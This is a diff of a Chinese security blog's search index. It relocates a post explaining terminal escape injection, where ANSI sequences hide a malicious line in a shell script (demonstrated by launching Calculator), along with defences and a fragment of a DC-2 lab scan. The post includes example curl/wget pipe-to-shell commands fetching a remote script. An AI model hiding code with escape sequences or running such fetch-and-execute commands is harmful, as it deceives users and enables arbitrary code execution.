-<p><img src="./2019-09-13-11-24-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="搜索漏洞"><br><img src="./2019-09-13-11-10-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="扫描模块"><br><img src="./2019-09-13-10-41-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 meterpreter"></p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -2019,6 +2019,58 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       </tags>
   </entry>
   <entry>
+    <title>Terminal Escape Injection</title>
+    <url>/2020/04/21/Terminal-Escape-Injection/</url>
+    <content><![CDATA[<p><img src="2020-04-22-10.33.50.gif" alt="2020-04-22-10.33.50"></p>
+<br>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"evil!"</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2Aecho <span class="string">"Hello World!"</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2Aecho <span class="string">"Hello World!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2A^[[Kecho <span class="string">"Hello World"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>查看文件内容时(<code>cat</code>、<code>tail</code>)，命令遇到了转义字符并执行了转义改变了光标的位置，转义所在行的内容覆盖了(执行转义)转义指定处的内容，呈现在用户眼前的是覆盖后的样子；此脚本被执行，程序正常执行包括恶意代码在内到 <code>exit</code> 的所有内容。看到的内容和执行的内容不同</p>
+<p>恶意代码的长度若是超出伪装字符，会出现如下情况（那就<code>^[[K</code>擦除行）：</p>
+<p><img src="https://gitee.com/t_mouse/BlogPics/raw/master/uPic/Images/2020-04-21-22-%E6%88%AA%E5%B1%8F2020-04-21%2022.03.22-zU0amB.png" alt="超出伪装字符"></p>
+<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><ul>
+<li>任意代码执行（ACE）</li>
+<li>在我们的系统上安装后门(RAT)</li>
+<li>在我们的系统中植入恶意软件或rootkit</li>
+<li>捕捉按键，记录我们的屏幕</li>
+<li>几乎所有你能想象到的东西都有(执行恶意文件的用户权限越高，后果越严重)</li>
+</ul>
+<br>
+
+<p>除了将它们植入到各种脚本中，还可以植入到：</p>
+<ul>
+<li>配置文件 – 可能会产生同样的影响(ACE)</li>
+<li>日志文件 – 作为侦查绕过工作的一部分</li>
+</ul>
+<br>
+
+<p>如原博文说的，Linux、macOS、Windows10(TH2之后) ，只要是支持 ANSI/VT 转义序列的终端模拟器都会受影响</p>
+<h2 id="如何避免这种攻击"><a href="#如何避免这种攻击" class="headerlink" title="如何避免这种攻击"></a>如何避免这种攻击</h2><p>提高安全意识！<br>提高安全意识！！<br>提高安全意识！！！</p>
+<p>一般从互联网上下载的便捷脚本或配置文件自己多少都会看几眼的吧，那便再多看几眼，这样就可以了</p>
+<p>查看文件内容使用 <code>cat -v</code> 或 <code>less</code>、<code>more</code>、<code>vim</code> .（<code>alias cat=&quot;cat -v&quot;</code> ）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">####### $ more filename.sh #######</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">ESC[2AESC[Kecho <span class="string">"Hello World"</span></span><br></pre></td></tr></table></figure>
+
+<p>避免仅通过 <code>curl/wget</code> 管道化到 shell 中来安装网络上的脚本或程序</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL <span class="string">"https://gist.githubusercontent.com/Mr-Potatoz/a0d2306f98cb63b6f1e2b8c12ec6433d/raw/1e427990adc540b8b77d87d31bc490af9aa829e8/install.sh"</span> | /bin/sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget -e robots=off -O- https://gist.githubusercontent.com/Mr-Potatoz/a0d2306f98cb63b6f1e2b8c12ec6433d/raw/1e427990adc540b8b77d87d31bc490af9aa829e8/install.sh)</span>"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="curl.gif" alt="curl"> </p>
+<h2 id="原博文"><a href="#原博文" class="headerlink" title="原博文"></a>原博文</h2><ul>
+<li><a href="https://www.infosecmatter.com/terminal-escape-injection" target="_blank" rel="noopener">Terminal Escape Injection</a></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>技能学习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DC-2</title>
     <url>/2020/03/25/DC-2/</url>
     <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line"></span><br><span class="line"><span class="comment">############# all port ###############</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br></pre></td></tr></table></figure>
@@ -2103,58 +2155,6 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       <tags>
         <tag>技巧</tag>
         <tag>Command</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Terminal Escape Injection</title>
-    <url>/2020/04/21/Terminal-Escape-Injection/</url>
-    <content><![CDATA[<p><img src="2020-04-22-10.33.50.gif" alt="2020-04-22-10.33.50"></p>
-<br>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"evil!"</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2Aecho <span class="string">"Hello World!"</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2Aecho <span class="string">"Hello World!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2A^[[Kecho <span class="string">"Hello World"</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>查看文件内容时(<code>cat</code>、<code>tail</code>)，命令遇到了转义字符并执行了转义改变了光标的位置，转义所在行的内容覆盖了(执行转义)转义指定处的内容，呈现在用户眼前的是覆盖后的样子；此脚本被执行，程序正常执行包括恶意代码在内到 <code>exit</code> 的所有内容。看到的内容和执行的内容不同</p>
-<p>恶意代码的长度若是超出伪装字符，会出现如下情况（那就<code>^[[K</code>擦除行）：</p>
-<p><img src="https://gitee.com/t_mouse/BlogPics/raw/master/uPic/Images/2020-04-21-22-%E6%88%AA%E5%B1%8F2020-04-21%2022.03.22-zU0amB.png" alt="超出伪装字符"></p>
-<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><ul>
-<li>任意代码执行（ACE）</li>
-<li>在我们的系统上安装后门(RAT)</li>
-<li>在我们的系统中植入恶意软件或rootkit</li>
-<li>捕捉按键，记录我们的屏幕</li>
-<li>几乎所有你能想象到的东西都有(执行恶意文件的用户权限越高，后果越严重)</li>
-</ul>
-<br>
-
-<p>除了将它们植入到各种脚本中，还可以植入到：</p>
-<ul>
-<li>配置文件 – 可能会产生同样的影响(ACE)</li>
-<li>日志文件 – 作为侦查绕过工作的一部分</li>
-</ul>
-<br>
-
-<p>如原博文说的，Linux、macOS、Windows10(TH2之后) ，只要是支持 ANSI/VT 转义序列的终端模拟器都会受影响</p>
-<h2 id="如何避免这种攻击"><a href="#如何避免这种攻击" class="headerlink" title="如何避免这种攻击"></a>如何避免这种攻击</h2><p>提高安全意识！<br>提高安全意识！！<br>提高安全意识！！！</p>
-<p>一般从互联网上下载的便捷脚本或配置文件自己多少都会看几眼的吧，那便再多看几眼，这样就可以了</p>
-<p>查看文件内容使用 <code>cat -v</code> 或 <code>less</code>、<code>more</code>、<code>vim</code> .（<code>alias cat=&quot;cat -v&quot;</code> ）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">####### $ more filename.sh #######</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">ESC[2AESC[Kecho <span class="string">"Hello World"</span></span><br></pre></td></tr></table></figure>
-
-<p>避免仅通过 <code>curl/wget</code> 管道化到 shell 中来安装网络上的脚本或程序</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL <span class="string">"https://gist.githubusercontent.com/Mr-Potatoz/a0d2306f98cb63b6f1e2b8c12ec6433d/raw/1e427990adc540b8b77d87d31bc490af9aa829e8/install.sh"</span> | /bin/sh</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget -e robots=off -O- https://gist.githubusercontent.com/Mr-Potatoz/a0d2306f98cb63b6f1e2b8c12ec6433d/raw/1e427990adc540b8b77d87d31bc490af9aa829e8/install.sh)</span>"</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="curl.gif" alt="curl"> </p>
-<h2 id="原博文"><a href="#原博文" class="headerlink" title="原博文"></a>原博文</h2><ul>
-<li><a href="https://www.infosecmatter.com/terminal-escape-injection" target="_blank" rel="noopener">Terminal Escape Injection</a></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>技能学习</tag>
       </tags>
   </entry>
 </search>
